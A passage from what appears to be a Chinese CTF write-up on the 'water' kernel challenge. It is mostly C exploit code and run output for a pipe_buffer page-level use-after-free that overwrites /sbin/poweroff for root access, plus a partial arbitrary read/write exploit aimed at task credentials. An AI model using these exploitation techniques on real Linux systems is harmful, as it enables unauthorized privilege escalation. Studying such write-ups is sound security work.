class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;fcntl to set the pipe in victim page&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;failed to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = <span class="built_in">splice</span>(target_fd, &amp;offset, snd_pipe_fd[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) <span class="built_in">err_exit</span>(<span class="string">&quot;splice() error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ? 还是find victim_idx 读取了 tag 和 idx 导致的指针偏移</span></span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], buffer, SND_PIPE_BUFS_SIZE - <span class="number">8</span> - <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> ||</span><br><span class="line">      (<span class="type">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;page: %#llx&quot;</span>, (<span class="type">size_t</span>)info_pipe_buf.page);</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;ops: %#llx&quot;</span>, (<span class="type">size_t</span>)info_pipe_buf.ops);</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;debug&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info_pipe_buf.flags |= PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">  info_pipe_buf.offset = <span class="number">0</span>;</span><br><span class="line">  info_pipe_buf.len = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 泄露信息的下一个pipe_buf</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;dirty pipe write target file&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(snd_pipe_fd[i][<span class="number">1</span>], payload, <span class="built_in">sizeof</span>(payload));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write ook&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(target_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> target_fd;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">  <span class="keyword">if</span> ((target_fd = <span class="built_in">open</span>(target_file, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /bin/busybox&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">read</span>(target_fd, buffer, <span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buffer, <span class="string">&quot;/bin/sh&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;do not write&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;/sbin/poweroff: %s&quot;</span>, buffer);</span><br><span class="line">  <span class="built_in">close</span>(target_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  dev_fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/water&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /dev/water&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cp /bin/sh /tmp/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cp /bin/cat /tmp/cat&quot;</span>);</span><br><span class="line">  <span class="built_in">page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;pause after uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">pipe_primitive</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;pause after dirty pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">check</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;if see this, write ok&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 结果如下，成功率蛮高的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Boot took 2.16 seconds</span><br><span class="line">/ $ ./exp</span><br><span class="line">[+] spray pipe</span><br><span class="line">[+] change ring_size make pipe-&gt;bufs kmalloc-512</span><br><span class="line">[+] kmalloc-512 hole</span><br><span class="line">[+] new chunk <span class="keyword">then</span> free</span><br><span class="line">write chunk data D</span><br><span class="line"></span><br><span class="line">[+] fill the hole</span><br><span class="line">[+] alloc pipe_buffer pages</span><br><span class="line">[+] uaf change pipe-&gt;bufs-&gt;page</span><br><span class="line">[+] find victim pipe</span><br><span class="line">[+] succeed find victim: 0, origin: 1</span><br><span class="line">pause after uaf</span><br><span class="line"></span><br><span class="line">[+] write pipe <span class="keyword">then</span> we can <span class="built_in">read</span></span><br><span class="line">[+] free origin pipe</span><br><span class="line">[+] fcntl to <span class="built_in">set</span> the pipe <span class="keyword">in</span> victim page</span><br><span class="line">[+] page: 0xffffea0000193140</span><br><span class="line">[+] ops: 0xffffffff82248500</span><br><span class="line">debug</span><br><span class="line"></span><br><span class="line">[+] dirty pipe write target file</span><br><span class="line">[+] write ook</span><br><span class="line">pause after dirty pipe</span><br><span class="line"></span><br><span class="line">/sbin/poweroff: <span class="comment">#!/tmp/sh</span></span><br><span class="line"> /tmp/ڀ@<span class="keyword">if</span> see this, write ok</span><br><span class="line"></span><br><span class="line">[   14.466663] BUG: Bad page state <span class="keyword">in</span> process exp  pfn:07714</span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">flag&#123;test_flag&#125;</span><br><span class="line">/bin/ls: line 3: syntax error: unexpected <span class="string">&quot;)&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="task-struct-cred"><a href="#task-struct-cred" class="headerlink" title="task struct cred"></a>task struct cred</h4><p>二级管道，任意地址读写，也可以写 <code>modprobe_path</code>。</p>
<p>为什么刚开始写pipe要写三个数字：因为我们要至少三次读取获得idx。</p>
<p>我们需要使用第二次page-level-uaf，借助另外三个管道：</p>
<ul>
<li>位置在第二个 uaf page ： pipe1 &amp; pipe2 &amp; pipe3，其page指针全都指向第二个 uaf page 对应的 struct page 结构体。</li>
<li>pipe1，实现任意地址读，只需要修改page指针和 offset + len 变量</li>
<li>pipe2，修改pipe3 </li>
<li>pipe3，可以修改pipe1 &amp; pipe 2 内容</li>
<li>只需要控制 pipe_buffer 的 page 指针、offset 和 len 就可以实现任意地址读写</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">origin ‾‾|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsx +</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsy + </span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsz +</span><br><span class="line">		  +------------+</span><br><span class="line"></span><br><span class="line">读取pipe_bufs2 获得 info_pipe_buf,然后通过 victim 写 pipe_bufs3，这里这个page</span><br><span class="line">origin ￣|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsx +</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsy + </span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsz + ‾‾‾‾‾‾‾‾‾‾|</span><br><span class="line">		  +------------+           |</span><br><span class="line">		  +   ...      +           |</span><br><span class="line">		  +------------+           |</span><br><span class="line">		  + pipe_bufsn + --------------&gt; page</span><br><span class="line">		  +------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">找到这两个idx, 然后构造二级page-level-uaf，使用 pipe_bufs 使用这个 page</span><br><span class="line">origin ￣|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsx +</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsy + </span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsz + snd_victim‾‾‾‾‾‾‾‾‾‾|</span><br><span class="line">		  +------------+                     |</span><br><span class="line">		  +   ...      +                     |</span><br><span class="line">		  +------------+                     |</span><br><span class="line">		  + pipe_bufsn + snd_origin--------------&gt; uaf  page</span><br><span class="line">		  +------------+                          +------------+</span><br><span class="line">									              + pipe_bufs1 +</span><br><span class="line">						                          +------------+</span><br><span class="line">						                          + pipe_bufs2 + </span><br><span class="line">						                          +------------+</span><br><span class="line">						                          + pipe_bufs3 +</span><br><span class="line">						                          +------------+</span><br><span class="line">						                          + pipe_bufs4 +</span><br><span class="line">						                          +------------+</span><br><span class="line">						                          +     ...    +</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">snd_victim_idx 写 0, 1, 2, 3 伪造对应的 pipe_buffer page len offset，都可以读写pipe_bufs2</span><br><span class="line"></span><br><span class="line">最终情形</span><br><span class="line">4 向 2 里面写内容，改变 page 和 offset 和 len，就能任意地址读。</span><br><span class="line">4 向 3 里写内容，使 Y write 开始地址为 Z</span><br><span class="line">3 改 4，可以一直写 X</span><br></pre></td></tr></table></figure>


<p>在构造第一个 page-level-uaf 中，读取内容即使找到也不能 break，否则第二次读取出错。</p>
<p>exp 如下</p>
<ul>
<li>在info leak 出错，不知道为什么读取不出来内容，看了几遍也不知道哪里出问题，当局者迷吧🤡。</li>
</ul>
<p>找到一篇文章：<a href="https://blog.csdn.net/qq_61670993/article/details/134359694">强网拟态2023-water-ker</a>，exp可以提权，编译时显示缺少了一个括号，补上就行。</p>
<p>如下为失败的exp。<del>没成功为什么要放上来，不能让我白写吧</del></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUMS 200</span></span><br><span class="line"><span class="comment">// kmalloc-cg-96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUFS_SIZE 96</span></span><br><span class="line"><span class="comment">// kmalloc-cg-192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRD_PIPE_BUFS_SIZE 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...) \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;\033[32m[+] &quot;</span> fmt <span class="string">&quot;\033[0m\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">page</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> *ops;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">size_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> victim_idx = <span class="number">-1</span>, origin_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> snd_victim_idx = <span class="number">-1</span>, snd_origin_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_2 = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_3 = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_4 = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> info_pipe_buf;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> evil_pipe_buf;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> evil_pipe_buf_2, evil_pipe_buf_3, evil_pipe_buf_4;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">water_args</span> &#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">new_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0x44</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = buffer,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">edit_chunk</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = &amp;c,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] error: %s&quot;</span>, msg);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;spray pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(spray_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;new chunk then free&quot;</span>);</span><br><span class="line">  <span class="built_in">new_chunk</span>();</span><br><span class="line">  <span class="comment">// debug(&quot;write chunk data D&quot;);</span></span><br><span class="line">  <span class="built_in">delete_chunk</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;get victim chunk&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i ++) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;alloc pipe_buffer pages&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;uaf change pipe-&gt;bufs-&gt;page&quot;</span>);</span><br><span class="line">  <span class="built_in">edit_chunk</span>(<span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find victim pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="type">char</span> tags[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(tags, <span class="number">0</span>, <span class="built_in">sizeof</span>(tags));</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], tags, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tags, <span class="string">&quot;deadbeef&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">      origin_idx = nr;</span><br><span class="line">      victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;succeed find victim: %d, origin: %d&quot;</span>, victim_idx, origin_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (victim_idx == <span class="number">-1</span> || origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;find idx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">second_page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x400</span>];</span><br><span class="line">  <span class="type">size_t</span> snd_pipe_sz =</span><br><span class="line">      <span class="number">0x1000</span> * (SND_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write something to no.1 victim pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        SND_PIPE_BUFS_SIZE * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;close no.1 origin idx pipe to page-level-uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;fcntl()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], buffer,</span><br><span class="line">       SND_PIPE_BUFS_SIZE - <span class="number">8</span> - <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;page pointer: %p\n\t\tops: %p&quot;</span>, info_pipe_buf.page,</span><br><span class="line">           info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> ||</span><br><span class="line">      (<span class="type">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hit the UAF page successful&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;construct no.2 page level uaf&quot;</span>);</span><br><span class="line">  info_pipe_buf.page = (<span class="keyword">struct</span> page *)(<span class="number">0x40</span> + (<span class="type">size_t</span>)info_pipe_buf.page);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find no.2 page uaf by pipe tags&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> nr = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="comment">// printf(&quot;%#x\n&quot;, nr);</span></span><br><span class="line">    <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUMS &amp;&amp; nr != i) &#123;</span><br><span class="line">      snd_origin_idx = nr;</span><br><span class="line">      snd_victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;find second pipe victim_idx: %d&quot;</span>, snd_victim_idx);</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;find second pipe origin_idx: %d&quot;</span>, snd_origin_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (snd_victim_idx == <span class="number">-1</span> || snd_origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;failed find snd pipe&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find no.2 idx sucessfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">construct_self_pipe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page_ptr;</span><br><span class="line">  <span class="type">size_t</span> trd_pipe_sz =</span><br><span class="line">      <span class="number">0x1000</span> * (TRD_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write to no.2 victim pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span 